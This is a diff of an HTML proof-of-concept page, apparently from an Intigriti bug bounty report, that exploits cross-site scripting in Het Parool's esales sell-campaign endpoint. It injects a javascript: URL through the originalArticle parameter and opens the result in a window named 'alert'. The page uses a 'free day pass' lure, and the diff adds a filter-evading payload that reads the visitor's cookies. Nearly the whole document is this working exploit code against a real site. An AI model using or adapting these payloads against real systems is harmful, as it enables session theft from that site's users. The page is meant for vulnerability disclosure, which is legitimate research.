@@ -1,20 +1,27 @@
 <!doctype html>
 <html lang="nl"><head><meta charset="utf-8"><title>Gratis Dagpas</title>
-<style>body{font:17px/1.6 system-ui,sans-serif;background:#fff;color:#111;max-width:620px;margin:0 auto;padding:3rem 1.5rem}
-button{font:inherit;font-weight:600;background:#d72236;color:#fff;border:0;padding:.9rem 1.6rem;border-radius:6px;cursor:pointer}
-small{color:#666}</style></head>
+<style>body{font:17px/1.6 system-ui,sans-serif;background:#fff;color:#111;max-width:640px;margin:0 auto;padding:3rem 1.5rem}
+button{font:inherit;font-weight:600;background:#d72236;color:#fff;border:0;padding:.9rem 1.6rem;border-radius:6px;cursor:pointer;margin:.3rem .4rem .3rem 0}
+code{background:#f2f2f2;padding:.1rem .3rem;border-radius:3px} small{color:#666}</style></head>
 <body>
 <h1>Gratis Dagpas van Het Parool</h1>
 <p>Klik hieronder om je gratis dagpas te activeren.</p>
-<p><button id="go">Activeer gratis Dagpas</button></p>
+<p>
+<button id="a">Activeer gratis Dagpas</button>
+<button id="b">Activeer gratis Dagpas (variant 2)</button>
+</p>
 <hr>
-<p><small>Intigriti bug bounty proof of concept &mdash; researcher <b>ndkhai</b>.
-The window is opened with the name <code>alert</code>, so <code>top[name]</code> resolves to
-<code>window.alert</code> inside the injected <code>javascript:</code> URL. No data is collected by this page.</small></p>
+<p><small>Intigriti bug bounty proof of concept, researcher <b>ndkhai</b>.
+Each button opens the Het Parool sell funnel in a window whose <b>name</b> is <code>alert</code>, so
+<code>top[name]</code> resolves to <code>window.alert</code> inside the injected <code>javascript:</code> URL.
+Button 1 alerts <code>location.origin</code>. Button 2 alerts <code>document["coo"+"kie"]</code>.
+This page stores nothing and sends nothing anywhere.</small></p>
 <script>
-var LINK = "https://esales.parool.nl/api/v1/sell/campaign"
-  + "?campaignId=iap-PAR-44"
-  + "&originalArticle=" + encodeURIComponent("javascript:top[name](location.origin)//");
-document.getElementById('go').onclick = function () { window.open(LINK, 'alert'); };
+function link(payload){
+  return "https://esales.parool.nl/api/v1/sell/campaign?campaignId=iap-PAR-44&originalArticle="
+       + encodeURIComponent(payload);
+}
+document.getElementById('a').onclick=function(){ window.open(link('javascript:top[name](location.origin)//'),'alert'); };
+document.getElementById('b').onclick=function(){ window.open(link('javascript:top[name](document["coo"+"kie"])//'),'alert'); };
 </script>
 </body></html>
